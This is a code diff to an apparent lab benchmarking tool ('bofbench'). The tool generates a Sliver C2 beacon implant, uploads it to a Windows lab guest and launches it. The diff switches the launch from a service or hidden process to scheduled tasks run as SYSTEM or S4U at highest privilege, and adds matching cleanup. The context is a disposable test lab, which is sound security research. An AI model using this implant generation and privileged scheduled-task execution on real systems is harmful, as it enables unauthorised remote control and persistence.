@@ -122,8 +122,10 @@ func sliverLabSessionStartCommand(stdout io.Writer, options *sliverOptions) *cob
 			sliverArch = "386"
 		}
 		quoted, _ := sliverConsoleQuote(localImplant)
-		rc := fmt.Sprintf("mtls --lhost 0.0.0.0 --lport 8888\ngenerate beacon --mtls %s:8888 --os windows --arch %s --format exe --seconds 5 --jitter 2 --save %s\nexit\n", providerStatus.Resource.GuestIPv4, sliverArch, quoted)
-		output, generateErr := runSliverRC(resolvedOptions.Client, rc)
+		rc := fmt.Sprintf("mtls --lhost 0.0.0.0 --lport 8888\ngenerate --mtls %s:8888 --os windows --arch %s --format exe --save %s\nexit\n", providerStatus.Resource.GuestIPv4, sliverArch, quoted)
+		generateCtx, generateCancel := context.WithTimeout(cmd.Context(), timeout)
+		output, generateErr := runSliverRCContext(generateCtx, resolvedOptions.Client, rc)
+		generateCancel()
 		if generateErr != nil {
 			return finish(fmt.Errorf("generate disposable Sliver session: %w", generateErr))
 		}
@@ -137,15 +139,19 @@ func sliverLabSessionStartCommand(stdout io.Writer, options *sliverOptions) *cob
 		receipt.ObjectSHA256 = hash
 		remotePath := fmt.Sprintf(`C:\bofbench\sessions\bofbench-sliver-%s-%s.exe`, arch, runlog.ID(runDir))
 		receipt.RemotePath = remotePath
+		if _, stderr, mkdirErr := lab.ExecutePowerShell(cmd.Context(), remote, `$ErrorActionPreference='Stop'; New-Item -ItemType Directory -Path 'C:\bofbench\sessions' -Force | Out-Null`); mkdirErr != nil {
+			return finish(fmt.Errorf("prepare session directory: %w: %s", mkdirErr, strings.TrimSpace(string(stderr))))
+		}
 		if _, stderr, uploadErr := lab.UploadFile(cmd.Context(), remote, localImplant, remotePath); uploadErr != nil {
 			return finish(fmt.Errorf("upload session executable: %w: %s", uploadErr, strings.TrimSpace(string(stderr))))
 		}
 		launch := fmt.Sprintf(`$ErrorActionPreference='Stop'; $path=%s; if((Get-FileHash -Algorithm SHA256 -LiteralPath $path).Hash.ToLower() -ne %s){throw 'session executable hash mismatch'}; `, psLiteral(remotePath), psLiteral(hash))
+		task := "BOFBench-Sliver-" + runlog.ID(runDir)
+		launch += fmt.Sprintf(`$action=New-ScheduledTaskAction -Execute $path; `)
 		if sessionContext == "system" {
-			service := "BOFBench-Sliver-" + runlog.ID(runDir)
-			launch += fmt.Sprintf(`New-Service -Name %s -BinaryPathName ('"'+$path+'"') -StartupType Manual | Out-Null; Start-Service -Name %s`, psLiteral(service), psLiteral(service))
+			launch += fmt.Sprintf(`$principal=New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest; Register-ScheduledTask -TaskName %s -Action $action -Principal $principal -Force|Out-Null; Start-ScheduledTask -TaskName %s`, psLiteral(task), psLiteral(task))
 		} else {
-			launch += `Start-Process -FilePath $path -WindowStyle Hidden`
+			launch += fmt.Sprintf(`$account=[System.Security.Principal.WindowsIdentity]::GetCurrent().Name; $principal=New-ScheduledTaskPrincipal -UserId $account -LogonType S4U -RunLevel Highest; Register-ScheduledTask -TaskName %s -Action $action -Principal $principal -Force|Out-Null; Start-ScheduledTask -TaskName %s`, psLiteral(task), psLiteral(task))
 		}
 		if _, stderr, launchErr := lab.ExecutePowerShell(cmd.Context(), remote, launch); launchErr != nil {
 			return finish(fmt.Errorf("launch session: %w: %s", launchErr, strings.TrimSpace(string(stderr))))
@@ -206,7 +212,7 @@ func sliverLabSessionStopCommand(stdout io.Writer, options *sliverOptions) *cobr
 			return err
 		}
 		receipt := sliverLabSessionReceipt{Schema: "bofbench.sliver-lab-session", SchemaVersion: 1, RunID: runlog.ID(runDir), Action: "stop", Lab: resolved.Name, Status: "running", StartedAt: time.Now().UTC().Format(time.RFC3339Nano), ReceiptPath: filepath.Join(runDir, "session.json")}
-		script := `$ErrorActionPreference='Stop'; Get-Service -Name 'BOFBench-Sliver-*' -ErrorAction SilentlyContinue|ForEach-Object{Stop-Service $_.Name -Force -ErrorAction SilentlyContinue; sc.exe delete $_.Name|Out-Null}; Get-CimInstance Win32_Process|Where-Object{$_.ExecutablePath -like 'C:\bofbench\sessions\bofbench-sliver-*.exe'}|ForEach-Object{Stop-Process -Id $_.ProcessId -Force}; Remove-Item -LiteralPath 'C:\bofbench\sessions' -Recurse -Force -ErrorAction SilentlyContinue; $remaining=@(Get-CimInstance Win32_Process|Where-Object{$_.ExecutablePath -like 'C:\bofbench\sessions\*'}).Count; if($remaining -ne 0){throw 'session processes remain'}; [ordered]@{status='complete';remaining=$remaining}|ConvertTo-Json -Compress`
+		script := `$ErrorActionPreference='Stop'; Get-ScheduledTask -TaskName 'BOFBench-Sliver-*' -ErrorAction SilentlyContinue|ForEach-Object{Stop-ScheduledTask -TaskName $_.TaskName -ErrorAction SilentlyContinue; Unregister-ScheduledTask -TaskName $_.TaskName -Confirm:$false}; Get-Service -Name 'BOFBench-Sliver-*' -ErrorAction SilentlyContinue|ForEach-Object{Stop-Service $_.Name -Force -ErrorAction SilentlyContinue; sc.exe delete $_.Name|Out-Null}; Get-CimInstance Win32_Process|Where-Object{$_.ExecutablePath -like 'C:\bofbench\sessions\bofbench-sliver-*.exe'}|ForEach-Object{Stop-Process -Id $_.ProcessId -Force}; Remove-Item -LiteralPath 'C:\bofbench\sessions' -Recurse -Force -ErrorAction SilentlyContinue; $remaining=@(Get-CimInstance Win32_Process|Where-Object{$_.ExecutablePath -like 'C:\bofbench\sessions\*'}).Count; if($remaining -ne 0){throw 'session processes remain'}; [ordered]@{status='complete';remaining=$remaining}|ConvertTo-Json -Compress`
 		output, stderr, runErr := lab.ExecutePowerShell(cmd.Context(), remote, script)
 		receipt.CompletedAt = time.Now().UTC().Format(time.RFC3339Nano)
 		receipt.Status = "complete"
